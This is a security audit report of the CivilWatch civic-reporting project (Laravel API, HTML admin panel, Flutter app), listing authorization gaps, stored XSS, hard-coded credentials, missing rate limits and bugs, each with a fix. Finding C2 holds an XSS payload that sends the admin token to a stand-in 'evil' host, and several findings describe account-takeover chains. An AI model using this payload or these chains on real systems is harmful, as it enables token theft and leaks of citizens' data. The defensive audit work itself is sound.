> **Saved 2026-11-17.** This is the original audit report. Every issue in it was fixed in changes 076–088; see `docs/changes/README.md`. Old seeded passwords quoted in the original are redacted here.

# CivilWatch: Full Project Audit Report

**Repo:** `ddertmo/civmain` @ `7e578d8` (main) · **Date:** 2026-11-17 · **Mode:** static, read-only review. No files were modified, and nothing was run against a live server.

**Legend:** ✅ **Confirmed**: an exploitable or broken code path was traced in source. ⚠️ **Potential**: the issue depends on deployment or config, or the source of the input was not proven.

All paths are relative to the repo root.

---

## 0. Project structure (what was audited)

| Part | Location | Tech |
|---|---|---|
| Backend API + Blade admin | `laravel/app`, `routes`, `config`, `database` | Laravel 12, Sanctum, MySQL (XAMPP) |
| Static admin / office web panel (≈30 pages) | `laravel/public/*.html`, `public/offices/{ceo,cenro}`, `public/js` | Vanilla JS, Leaflet, Chart.js |
| Citizen mobile app | `civ-main/lib` (79 Dart files), android/ios configs | Flutter, ChangeNotifier singleton |
| DB dump | `laravel/civilwatch_FINAL.sql` | MySQL dump |
| Tooling / docs | `graphify-out/` (536 generated files), `docs/`, `.bat`/`.ps1` scripts | n/a |

**Authentication model:**
- Staff (`users` table, email + password) get a Sanctum token from `/api/login`.
- Citizens (`citizens` table, phone + 6-digit PIN or OTP) get a Sanctum token through the `citizen` guard.

**Report workflow:** Submitted → Pending Validation → Approved → Assigned to Office → In Progress → Resolved (or Rejected).

---

## 1. CRITICAL

### C1. A citizen's mobile token works on every staff API route ✅
- **File:** `laravel/config/auth.php:41-52`. It defines no `sanctum` guard, but `routes/api.php:86` and `:118` use `auth:sanctum`.
- **Code location:** guard config; `app/Http/Middleware/EnsureSuperAdmin.php:27` (lets every GET through); `AdminCitizenReportController::index` line 44 (filters only roles `ceo`/`cenro`).
- **Problem:** with no `auth.guards.sanctum` entry, Sanctum's guard runs with `provider = null` and accepts a token belonging to *any* tokenable model, including `Citizen`.
  - `EnsureSuperAdmin` passes every GET.
  - A citizen has `role = null`, so the office filter does not apply and the citizen sees everything.
- **Impact:** any citizen can call `GET /api/admin/citizen-reports?limit=500` and receive every report with every reporter's full name, phone and address.
  - The same token also reads `/api/users` (staff emails and roles) and analytics.
  - It can call `DELETE /api/notifications`, which wipes every citizen's notification feed.
  - Registration needs no OTP (H1), so **anyone on the internet can get such a token with one request.** This is the most dangerous issue in the project.
- **Fix:** bind the guard to staff users, and add a staff-only check as defence in depth.
```php
// config/auth.php → 'guards'
'sanctum' => ['driver' => 'sanctum', 'provider' => 'users'],

// app/Http/Middleware/EnsureStaff.php
public function handle($request, Closure $next) {
    abort_unless($request->user() instanceof \App\Models\User, 403);
    return $next($request);
}
// routes/api.php: ->middleware(['auth:sanctum', 'staff', ...])
```
- **Verify after fixing:** log in as a citizen and confirm that `GET /api/admin/citizen-reports` returns 401 or 403. `vendor/` is not installed in this checkout, so this was traced from Sanctum's guard logic rather than run.

### C2. Stored XSS in the admin and office panels → admin token theft ✅
- **Files and lines:**
  - `laravel/public/pending-reports.html:243-270` (`render()`, e.g. `${r.issue || r.concern}` at line 259)
  - `monitoring.html:698-715`, `assign-office.html:2109-2117`, `gis-map.html:241, 324-334, 368-383`
  - `dashboard.html:570-572, 614-620, 689-690`
  - `offices/{ceo,cenro}/reports.html:305-308` (and `inprogress`/`resolved`)
  - Leaflet popups: `report-details.html:584`, `monitoring.html:1154`, `monitoring-report-details.html:612`, `offices/*/report-details.html:898/858`, `resources/views/admin/map.blade.php:72-77`
  - ⚠️ `public/js/app.js:613` (`${n.message}` in the notification panel, which loads on every page)
- **Problem:** text controlled by citizens is put into template strings and assigned to `innerHTML` or `bindPopup` without escaping. Affected fields include `concern`, `description`, `fullName`, `phone`, `barangay` and `imageUrl`. The server accepts any string, for example `concern` is validated only as `string|max:100` (`MobileReportController.php:49`).
- **Impact:** a citizen submits a report whose concern is `<img src=x onerror=fetch('//evil/?'+localStorage.cw_token)>`.
  - The script runs when the super admin opens Pending Reports.
  - Staff tokens are stored in `localStorage` (`index.html:267-271`) and never expire (M2), so the attacker takes over the admin account for good.
- **Fix:** add one escape helper and use it at every interpolation, or build the DOM with `textContent`. Then add a Content-Security-Policy that blocks inline handlers.
```js
// public/js/utils.js
Utils.esc = s => String(s ?? '').replace(/[&<>"'`]/g, c =>
  ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;'}[c]));
// usage
`<span class="table-issue-name">${Utils.esc(r.issue || r.concern || '—')}</span>`
marker.bindPopup(`<strong>${Utils.esc(r.concern)}</strong><br>${Utils.esc(r.barangay)}`);
```

### C3. Super-admin credentials are hard-coded, shown on the login page and committed ✅
- **Files:**
  - `laravel/public/index.html:197-199` displays `admin@civilwatch.ph / [redacted]` and `ceo@civilwatch.ph / [redacted]`.
  - `index.html:289-292` auto-fills the super-admin password on page load.
  - `laravel/civilwatch_FINAL.sql:18-21` has the same credentials plus citizen `+639171234567` with PIN [redacted] in plain text; lines 608-609 and 281 hold their hashes.
  - `laravel/database/seeders/DatabaseSeeder.php:21,36` hard-codes and prints `[redacted]`.
- **Impact:** any instance built from the dump or seeder has a publicly known super-admin password, so anyone who can reach the login page has full control. There is no rate limiting (H2).
- **Fix:**
  - Delete the credentials note and the auto-fill.
  - Remove the credentials from the dump.
  - Seed from env or a random value, and force a password change on first login.
  - **Rotate these passwords on every machine where the dump or seeder was used.**
```php
// DatabaseSeeder.php
$pwd = env('SEED_ADMIN_PASSWORD') ?: Str::password(16);
User::create([... 'password_hash' => Hash::make($pwd)]);
$this->command->warn("Super admin password: {$pwd} (change it now)");
```

### C4. Debug mode returns the OTP in the API response ⚠️ (Critical if deployed this way)
- **File:** `laravel/app/Http/Controllers/Mobile/MobileAuthController.php:128-130` (`sendOtp`), combined with `laravel/.env.example` (`APP_ENV=local`, `APP_DEBUG=true`).
- **Problem:** when `config('app.debug')` is true, `data.otp` is returned even when SMS is configured. A deployment set up by copying `.env.example` therefore leaks every OTP.
- **Impact:** an attacker calls `send-otp` with the victim's number, reads the OTP from the response, then calls `reset-pin` or `verify-otp` and takes over the account. Debug mode also leaks stack traces.
- **Fix:** remove the echo, or gate it on `app()->environment('local')`. Ship `.env.example` with `APP_DEBUG=false`. *Need from you: the real `.env` values for APP_ENV and APP_DEBUG on every deployed machine.*

---

## 2. HIGH

### H1. Registration does not require a verified OTP, so anyone can take any phone number ✅
- **File:** `MobileAuthController.php:312-387` (`register`).
- **Problem:** `register` only checks that the phone number is not already registered. `verifyOtp` returns no proof for new users (lines 199-208), so nothing ties registration to OTP ownership.
- **Impact:** people can be impersonated and phone numbers squatted. It also gives anyone the citizen token that C1 needs.
- **Fix:** `verifyOtp` issues a short-lived registration ticket, and `register` requires it and consumes it.
```php
// verifyOtp (new user)
$ticket = Str::random(40);
Cache::put("reg:$ticket", $normalized, now()->addMinutes(10));
return [... 'registrationTicket' => $ticket];

// register
$phone = Cache::pull('reg:'.$request->registrationTicket);
abort_unless($phone && $phone === $normalized, 422, 'Phone not verified.');
```

### H2. No rate limiting on login, OTP or PIN, so brute force and SMS-credit abuse are possible ✅
- **Files:** `routes/api.php:44-51`, `:116`. There is no `throttle` anywhere in the codebase. `app/Models/OtpCode.php:62` (`findValid`) has no attempt counter.
- **Problem:**
  - The 6-digit PIN at `login` can be guessed without limit, and its messages differ for "No account" and "Incorrect PIN".
  - `verify-reset-otp` checks an OTP without consuming it, so guesses are unlimited.
  - `verify-otp` alone issues a login token.
  - `send-otp` can flood any phone with SMS and spend UniSMS credits.
  - Staff `/api/login` has no limit either.
- **Impact:** citizen accounts can be taken over (10⁶ OTP codes in 5 minutes is feasible in parallel), and SMS costs can be run up.
- **Fix:**
```php
Route::middleware('throttle:5,1')->group(function () {
    Route::post('login', ...); Route::post('verify-otp', ...);
    Route::post('verify-reset-otp', ...); Route::post('reset-pin', ...);
});
Route::post('send-otp', ...)->middleware('throttle:3,10');
Route::post('/login', [AuthController::class, 'login'])->middleware('throttle:5,1');
// otp_codes: add `attempts` column; increment on miss; invalidate at >= 5
```

### H3. Admin notification endpoints change and delete *every citizen's* notifications ✅
- **File:** `laravel/app/Http/Controllers/NotificationController.php:53, 69, 83, 97` (`markRead`, `markAllRead`, `destroy`, `destroyAll`). The routes at `routes/api.php:146-151` have only `auth:sanctum`.
- **Problem:** the admin bell reads and writes the shared `citizen_notifications` table. `destroyAll` runs `CitizenNotification::query()->delete()`, and `markAllRead` marks every citizen's notifications as read. CEO/CENRO staff can do this, and so can citizens via C1.
- **Impact:** irreversible loss of data that citizens see.
- **Fix:** give staff their own `admin_notifications` table, or a per-user read-state table. Never mutate the citizen feed from admin endpoints, and at minimum put the writes behind `superadmin`.

### H4. `reports:clear-dummy` deletes real reports ✅
- **File:** `laravel/app/Console/Commands/ClearDummyReports.php:29-40, 94`. The seeder (`CitizenReportSeeder.php:16`) is now empty.
- **Problem:** the command treats `CW-2026-00101` … `00110` as dummy data, but `generateReferenceNumber()` gives exactly those numbers to real reports 101 to 110 of 2026. It deletes them, with their activities and notifications, and with no transaction.
- **Fix:** delete the command, or mark seeded rows with an `is_seed` flag and filter on that.

### H5. Reference numbers collide, so report submission returns 500 ✅
- **File:** `laravel/app/Models/CitizenReport.php:106-111` (`generateReferenceNumber`).
- **Problem:** the number is `whereYear(created_at)->count() + 1`.
  - Two concurrent submissions get the same number.
  - Any deletion makes the next number repeat an existing one.
  - The column is UNIQUE, so the insert fails. The uploaded photo has already been stored and becomes an orphan (`MobileReportController.php:65-67`).
- **Fix:**
```php
$report = DB::transaction(function () use ($data) {
    $r = CitizenReport::create($data + ['reference_number' => 'TMP-'.Str::uuid()]);
    $r->update(['reference_number' => sprintf('CW-%d-%05d', now()->year, $r->id)]);
    return $r;
});
```

### H6. The Flutter app allows cleartext HTTP, and its default backend is localhost ✅
- **Files:** `civ-main/android/app/src/main/AndroidManifest.xml:14` (`usesCleartextTraffic="true"`), `civ-main/ios/Runner/Info.plist:77-82` (`NSAllowsArbitraryLoads`), `civ-main/lib/core/constants/api_constants.dart:21-24` (default `http://127.0.0.1:8000/api`).
- **Impact:** the PIN, OTP and bearer token travel in plain text. A release build made without `--dart-define` cannot reach the server.
- **Fix:** require an HTTPS `API_BASE_URL` in release builds, and move the cleartext and ATS exceptions into debug-only config (`src/debug/AndroidManifest.xml`).

### H7. The Users page is completely broken (JavaScript SyntaxError) ✅
- **File:** `laravel/public/users.html:822-824` and `835-837`. `let usersData`, `let filtered` and `let activeUser` are each declared twice.
- **Problem:** the duplicate declarations are a parse error, so none of the page script runs. In addition, `AVATAR_COLORS` (line 827) is never defined, and `loadUserStats()` is never called.
- **Fix:** remove the second block of declarations, define `AVATAR_COLORS`, load the data, and escape every field (C2).

### H8. Effectively no automated tests ✅
- **Files:** `laravel/tests` has only `ExampleTest`s. `civ-main/test` has a smoke test and a theme test.
- **Problem:** `phpunit.xml` uses in-memory SQLite, but migrations `2026_10_06_*` and `2026_10_08_*` run MySQL-only `ALTER TABLE … MODIFY ENUM`. Any `RefreshDatabase` test will fail.
- **Impact:** C1, H1, H3 and H5 would each have been caught by a basic feature test.
- **Fix:** guard the raw SQL with `if (DB::getDriverName() === 'mysql')`. Then add feature tests for: the full report flow, OTP single use, reference-number uniqueness, office scoping, and a citizen token being rejected on staff routes.

---

## 3. MEDIUM

| # | Issue | Status | Location | Problem → Impact | Recommended fix |
|---|---|---|---|---|---|
| M1 | Office staff can read other offices' reports (IDOR) | ✅ | `AdminCitizenReportController.php:75-86` (`show`); `AdminWebController.php:89-113`, `map`, `dashboard` | `index()` is scoped by office; `show()` and the Blade pages are not. CEO can read CENRO, unassigned and rejected reports, including the citizen's PII, by id or sequential `CW-` reference | Shared query scope `forStaff($user)` used in `index`, `show` and Blade: `abort_if($isOffice && $report->assignedOffice?->abbreviation !== $abbr, 403);` |
| M2 | Tokens never expire; deactivated accounts keep access | ✅ | No `config/sanctum.php`; `MobileAuthController.php:184-196` (`verifyOtp` skips `is_active`); `AuthController` | Deactivated citizens can log back in through OTP. Staff tokens live forever, which makes C2 worse | Set `SANCTUM_EXPIRATION`; check `is_active` in `verifyOtp` and in middleware; delete tokens on deactivation |
| M3 | Status workflow transitions not enforced | ✅ | `AdminCitizenReportController.php:164-224`; `AdminWebController.php:142-158`; `CitizenReport.php:146`; `public/report-details.html:440-445, 624-643` | Super admin can go Resolved→Submitted, or Assigned with no office. `resolved_at` is never cleared. The report-details page posts "In Progress" by default for Approved reports | Transition map in the model (`const TRANSITIONS = [...]`), enforced in `transitionTo()`; UI sends only an explicit choice |
| M4 | No transactions or locking on multi-write operations | ✅ | `CitizenReport.php:116-171` (`transitionTo`); `AdminCitizenReportController.php:104-108, 138-146`; `MobileAuthController.php:168-178, 287-300`; `OtpCode.php:46-56` | Concurrent `assign` lets two offices overwrite each other and duplicates activities and notifications. An OTP can be used twice. A failure part-way leaves the status changed with no audit record | `DB::transaction` + `lockForUpdate()`; atomic OTP consume: `OtpCode::whereKey($id)->where('is_used',false)->update(['is_used'=>true]) === 1` |
| M5 | SMS network failure crashes the request | ✅ | `laravel/app/Services/UniSmsService.php:52, 76, 88` | `ConnectionException` is not caught, so the user gets a 500 after a 15 s wait, with the OTP already stored. SMS is also sent synchronously | `try/catch ConnectionException` → `$this->fail(...)`; send from a queued job |
| M6 | `last_login_at` is never saved | ✅ | `AuthController.php:56`; `AdminWebController.php:42`; `app/Models/User.php` `$fillable` | The field is missing from `$fillable`, so the update drops it silently | Add it to `$fillable`, or use `forceFill([...])->save()` |
| M7 | Dashboards disagree on status counts | ✅ | `AnalyticsController.php:58` (no `Approved`); `AdminCitizenReportController.php:320-334`, `AdminWebController.php:62-70` (no `rejected`) | Charts and percentages are wrong and inconsistent | Build every count from `CitizenReport::STATUS_ORDER` in one shared summary method |
| M8 | Analytics silently truncates at 500 reports, with a huge payload | ✅ | `public/analytics.html:650-654`; `AdminCitizenReportController.php:20, 55-58` | The page asks for 1000 rows; the server caps at 500, and each row includes its full activity log and citizen | Use the existing SQL-aggregated `/api/analytics`; return a slim row shape for lists |
| M9 | Buttons show success without doing anything | ✅ | `offices/ceo/reports.html:351-354`, `offices/cenro/reports.html:331-333`; `users.html:982, 986, 1025-1028`; `settings.html:852, 972, 1098` | Staff believe a status, user or setting changed when it did not | Wire them to real endpoints, or disable them |
| M10 | Silent fallback to sample or dummy data | ✅ | `public/js/utils.js:230-245`; `offices/*/report-details.html:714-790, 906-932`; office `dashboard`, `map`, `analytics` fully hard-coded; Flutter `civ-main/lib/core/state/app_state.dart:60-63, 137-139, 176-189, 266-288` | When the API fails or there is no token, fake reports, citizens and notifications are shown as real. Save/Resolve can post sample references to the real API | Remove the fallbacks, or limit them to `kDebugMode` or local; show an error or retry state |
| M11 | N+1 queries and unbounded result sets | ✅ | `MobileReportController.php:23-34` (`citizen` not eager-loaded); `community` (`:120-129`, public, unbounded); `AdminCitizenReportController::map` (`:300`); `UserController::index` (`:40`); `AdminAnnouncementController::index` (`:14`) | Slower as data grows. The public community endpoint can be used to load the server | `with('citizen')`, paginate or cursor, select columns, cache the map payload briefly |
| M12 | Analytics computed with dozens of COUNT queries | ✅ | `AnalyticsController.php` (`summary` 8, `weeklyTrend` 5, `monthlyTrend` 6, `full()` ≈24 with JSON re-decode) | Slow dashboard; `whereYear`/`whereMonth` cannot use an index | One `GROUP BY` per chart: `selectRaw("DATE_FORMAT(created_at,'%Y-%m') m, COUNT(*) c")->groupBy('m')` |
| M13 | Missing DB indexes | ✅ | migrations under `laravel/database/migrations` | No index on `citizen_reports.status/is_public/created_at/category/barangay`, `citizen_notifications.is_read` (polled every 30 s), or `otp_codes(phone,code)` | New migration adding `index(['is_public','status'])`, `index('created_at')`, `index(['citizen_id','is_read'])`, `index(['phone','code'])` |
| M14 | Demo and test pages are publicly served | ✅ | `laravel/public/test.html` (sends real SMS, shows OTP and token, line 146 says "delete before deploying"); `register-demo.html`; `reset-demo.html` | Unauthenticated tools for draining SMS credits and abusing the auth flows | Delete them, or serve them only when `app()->environment('local')` |
| M15 | Flutter token stored in SharedPreferences; backups allowed | ✅ | `civ-main/lib/core/network/api_client.dart:22-35`; manifest has no `allowBackup` | The token is in plain prefs and included in device backups. `flutter_secure_storage` is declared but never used | Use `FlutterSecureStorage` on mobile; `android:allowBackup="false"` |
| M16 | Flutter: no HTTP timeouts; startup waits on the network | ✅ | `api_client.dart:47, 61, 87, 97`; `civ-main/lib/main.dart:10` | The app hangs on the splash screen for over a minute when the server is down | `.timeout(const Duration(seconds: 15))`; call `runApp` first and load in the background |
| M17 | Flutter logs the user out whenever the app starts offline | ✅ | `civ-main/lib/services/auth_service.dart:31-34` (`restoreSession`) | Any exception deletes the token | Delete only when `e is ApiException && e.isUnauthorized` |
| M18 | Flutter map controller moved before it exists; not disposed | ⚠️ | `civ-main/lib/screens/report/report_location.dart:238-248, 48-52`; `community_map_screen.dart:24` | The GPS path shows "Could not get location" even though GPS succeeded; controllers leak | Move the camera in `addPostFrameCallback`; `_mapController.dispose()` |
| M19 | Barangay silently set to a wrong default | ✅ | `civ-main/lib/screens/report/report_details.dart:34` (`?? 'Aplaya'`); `report_location.dart:149, 280-282`; server `MobileReportController.php:53` | Reports routed to the wrong place; analytics skewed | Required field; server-side `Rule::in(BARANGAYS)` |
| M20 | Android release build signed with the debug key | ✅ | `civ-main/android/app/build.gradle.kts:28-33` | Cannot publish; anyone can sign an "update" with the debug key | Real release keystore; enable R8 |
| M21 | Report workflow written 3 times; CEO and CENRO pages duplicated | ✅ | `AdminWebController.php:115-190` vs `AdminCitizenReportController`; `public/offices/{ceo,cenro}/*` (8 near-identical pairs); render code copied in `report-details`, `monitoring-report-details`, `monitoring` | The copies already disagree (web map has no `is_public` filter). The C2 fix must be repeated in about 25 places | `ReportWorkflowService`; one office page set parameterised by role; shared helpers in `utils.js` |
| M22 | `graphify-out/` is about 89% of the repo | ✅ | `graphify-out/` (536 files, 30.5 MB of the 34.4 MB tree; dated snapshots 20 MB) | Repo bloat and noisy diffs | Ignore `graphify-out/cache/` and `graphify-out/20*/`, then `git rm --cached` |
| M23 | Committed SQL dump out of sync with migrations | ✅ | `laravel/civilwatch_FINAL.sql:447-459, 218, 256-266`; `START_ALL.bat:70` (migrate output hidden with `>nul 2>&1`) | The dump lacks `priority`, `street/purok/province` and the `sessions` table. Setup can fail silently | Regenerate from `migrate:fresh --seed`, or drop the dump; stop hiding migrate errors |

---

## 4. LOW

| # | Issue | Status | Location | Fix |
|---|---|---|---|---|
| L1 | Account enumeration: citizen login says "No account" vs "Incorrect PIN"; staff login reports deactivation before checking the password | ✅ | `MobileAuthController::login`; `AuthController.php:39-44` | One generic error; check the password first |
| L2 | Every staff role can read all staff accounts (emails, roles) | ✅ | `UserController.php:17-69`; `routes/api.php:97, 126, 128` | Put reads behind `superadmin` too |
| L3 | Catch-all `.html` route uses an unsanitised path | ⚠️ | `laravel/routes/web.php:40-49` | `realpath()` and require that it starts with `public_path()` |
| L4 | CORS allows `*` | ⚠️ | `laravel/config/cors.php:21` | Restrict to the real origins in production |
| L5 | SMS provider error text and phone numbers leak in responses and logs | ✅ | `MobileAuthController.php:107-124`; `UniSmsService.php:130-132` | Generic message to the client; mask phone numbers in logs |
| L6 | OTP stored in plain text; session cookie not secure; EXIF/GPS kept in public photos, which are visible before approval | ✅ | `otp_codes.code`; `.env.example`; `storage/app/public/report-photos` | Hash OTPs; `SESSION_SECURE_COOKIE=true`; strip EXIF on upload |
| L7 | No CSP and no SRI on CDN scripts (Chart.js, Leaflet) | ✅ | e.g. `public/analytics.html:209`, `dashboard.html:481` | Pin versions with `integrity`, or self-host; add a CSP header |
| L8 | Auto-refresh wipes active filters and loads twice | ✅ | `pending-reports.html:398, 416, 420-428`; `monitoring.html:920, 942` | Call `applyFilter()` after reloading; fix the `beforeunload` flag |
| L9 | `requireAuth()` does not stop the page script; dead JS with a syntax error | ✅ | `public/js/app.js:153-162`; `public/js/auth.js:235` (`user ? .name ? .split`); unused `dashboard.js`, `users.js` | Return or throw after redirecting; delete the dead files |
| L10 | Office report-details timeline bugs | ✅ | `offices/ceo/report-details.html:1020` (`getElementById(...).remove?.()` throws when the element is null), `:838` (assigned date is the submitted date) | `document.getElementById(...)?.remove()`; use `Utils.assignedDate` |
| L11 | Controllers type-hint `int $id` without a route constraint, so a non-numeric id returns 500 instead of 404 | ✅ | e.g. `AdminCitizenReportController::validate(int $id)` | `->whereNumber('id')` |
| L12 | Small backend bugs | ✅ | `AdminOfficeController.php:15-16` (new offices never listed); `UserController.php:134` (office cannot be cleared), `:37` (`is_active` string compare), `:186` (dead `dashboardStats`); `Citizen.php:58` overrides the `Notifiable` relation | Fix each one individually |
| L13 | Flutter `setState` after an async gap without a `mounted` check; stale geocode race | ✅ | `report_location.dart:119-134, 249`; `report_photo.dart:38` | `if (!mounted) return;` + a request id |
| L14 | Flutter image upload and display gaps | ⚠️ | `report_photo.dart:30-38` (no size or type check; HEIC); `Image.network` with no `errorBuilder` in `report_card.dart:50`, `community_map_screen.dart:520`, `track_report_screen.dart:1133, 1273`, `private_map_screen.dart:435, 485` | Check size and type, request JPEG; use the existing `AppNetworkImage` |
| L15 | Flutter state inconsistencies | ✅ | `app_state.dart:135-142` (unread count not reset on logout), `:200, 354-377` (fakes 2 notifications on submit), `:292-297` (`markAllRead` ignores errors); `report_service.dart:80` (severity hard-coded); `track_by_reference_screen.dart:38` (searches the local cache only); `api_client.dart:133` (unsafe cast) | Server-driven state; add `GET /mobile/reports/track/{ref}` |
| L16 | Dead SMS service with a client-side key design | ✅ | `civ-main/lib/services/semaphore_service.dart:17, 46` | Delete it |
| L17 | Unused dependencies | ✅ | `civ-main/pubspec.yaml` (`url_launcher`, `flutter_secure_storage` (use it instead, see M15), `permission_handler`, `cupertino_icons`); root `package.json` (unrelated `@messagebird/sdk: latest`, missing `src/index.ts`); `laravel/package.json` (only for the unused welcome page); `laravel/sail` | Remove them; bundle Google Fonts (`allowRuntimeFetching = false`) |
| L18 | Deprecated Flutter API `withOpacity` (64 uses in 23 files) | ✅ | `civ-main/lib/**` | `.withValues(alpha: x)` |
| L19 | Dead files | ✅ | `laravel/resources/views/t1.php`, `welcome.blade.php` (82 KB, unrouted) | Delete them |
| L20 | Stale docs | ✅ | `README.md:3-4` (says the Playwright `e2e/` tests are required; they were deleted); `laravel/docs/SUPER_ADMIN.md:186` | Update |
| L21 | Scripts with hard-coded paths and side effects | ✅ | `RUN_APP.bat:8, 19` (`flutter pub upgrade` on every launch); `START_ALL.bat:9-13, 55, 90-92` | Use env vars; `flutter pub get` |
| L22 | `.gitignore` gaps; build artifact tracked | ✅ | `civ-main/android/build/reports/problems/problems-report.html`; root `.gitignore` has no `node_modules/` or `.env` | Add the ignores; `git rm --cached` |

---

## 5. Checked and found OK
- **SQL injection:** none found. Only static `DB::raw('COUNT(*)')` is used; LIKE searches and filters are bound; no user input reaches `orderBy`; no shell execution.
- **Citizen-to-citizen IDOR:** none. Mobile `reports/{id}` and `notifications/{id}` are scoped by `citizen_id`. A staff token cannot pass `auth:citizen`.
- **Office write paths:** `updateStatus` and `updatePriority` enforce role and office ownership. Super-admin writes are gated.
- **Mass assignment:** no `$guarded = []` and no `$request->all()`. `password_hash` and `pin_hash` are hidden.
- **OTP basics:** generated with `random_int`, 5-minute expiry, older codes invalidated. `resetPin` revokes tokens inside a transaction.
- **File upload:** `image` rule (no SVG), 5 MB limit, random hashed file names. No endpoint reads files by a user-supplied path.
- **Blade:** no `{!! !!}`. CSRF on all Blade forms. `api/*` is exempt, which is fine for bearer auth.
- **Secrets:** no real API keys in code, config or `.env.example`. `.env` is gitignored. The PII in the dump appears to be dummy data.
- **Flutter:** debug toggles are limited to `kDebugMode`; auth screens check `mounted`; timers and text controllers are disposed; the manifest is not debuggable.

---

## 6. Final summary

### Totals
| Severity | Confirmed | Potential | Total |
|---|---|---|---|
| Critical | 3 | 1 | **4** |
| High | 8 | 0 | **8** |
| Medium | 22 | 1 | **23** |
| Low | 19 | 3 | **22** |
| **Total** | **52** | **5** | **57** |

(Some rows group several closely related instances, for example C2 covers about 15 XSS sinks.)

### Security risk assessment: **HIGH, not production-ready**
- An anonymous attacker can **register with any phone number without an OTP** (H1).
- They then use that **citizen token on the staff API** (C1) to download every citizen's name, phone and address, and to wipe all notifications (H3), **with two HTTP requests**.
- Separately, a single malicious report gives **persistent super-admin takeover** through stored XSS (C2).
- The super-admin password is **printed on the login page** (C3).

### Most dangerous vulnerabilities
1. **C1 + H1**: unauthenticated mass leak of citizens' personal data
2. **C2**: stored XSS → admin token theft (tokens never expire)
3. **C3**: public default super-admin credentials
4. **H2 + C4**: OTP and PIN brute force or OTP echo → citizen account takeover
5. **H3**: any authenticated user can delete every citizen's notifications

### Recommended fix order
1. **Same day:** C1 (one config line plus a staff middleware), C3 (remove the login note and auto-fill, rotate passwords), and set `APP_DEBUG=false` (C4).
2. **Next:** H1 registration ticket; H2 throttling and OTP attempt counter; H3 separate admin notifications.
3. **Then:** C2 escape helper across all sinks plus CSP; M2 token expiry and `is_active` checks; M1 office scoping in `show()`; M14 delete demo pages.
4. **Data integrity:** H5 reference numbers; H4 delete `clear-dummy`; M3 + M4 transition map with transactions; M5 SMS error handling.
5. **Mobile release:** H6 HTTPS-only; M15 secure storage; M20 release signing; M16 and M17 timeouts and offline session.
6. **Stability and UX:** H7 users.html; M9 fake-success buttons; M10 sample-data fallbacks; M7 and M8 analytics.
7. **Tests (H8):** add feature tests that lock in fixes 1 to 4 before refactoring.
8. **Performance and cleanup:** M11 to M13 queries and indexes; M21 deduplication; M22 graphify bloat; M23 dump; the Low items.

### Overall project health: **5/10**
- **Strengths:** the feature set is broad and working, with a clear status workflow and good use of Eloquent. There is no SQL injection, mass assignment is handled, citizen-to-citizen access is scoped correctly, the office write checks are right, and the change log is thorough.
- **Weaknesses:**
  - Authentication and authorization have structural gaps (guard config, read access open to every role, no throttling).
  - Untrusted data is rendered unescaped across the admin UI.
  - There are almost no tests.
  - Logic is heavily duplicated across three frontends.
  - Demo and sample-data code is mixed into production paths.

### Not verified, and what I need from you
- **Runtime confirmation of C1:** `laravel/vendor/` is not installed in this checkout, so I traced Sanctum's behaviour from its guard logic rather than running it. A 2-minute test against your local XAMPP instance would confirm it.
- **Production configuration:** the real `.env` (APP_ENV, APP_DEBUG, SANCTUM_EXPIRATION, UNISMS settings), whether production uses HTTPS, and the Apache vhost config. These decide C4, H6, L3, L4 and L6.
- **Live database:** whether the seeded `admin@`/`ceo@` accounts and passwords exist on any reachable instance (C3).
- **Dependency CVEs:** `composer.lock` and `pubspec.lock` versions were not checked against advisories (no network audit was run). Run `composer audit` and `flutter pub outdated` locally.
- **Tooling not audited:** `.opencode/` skills and `graphify-out/` content were reviewed only for size, not for content.
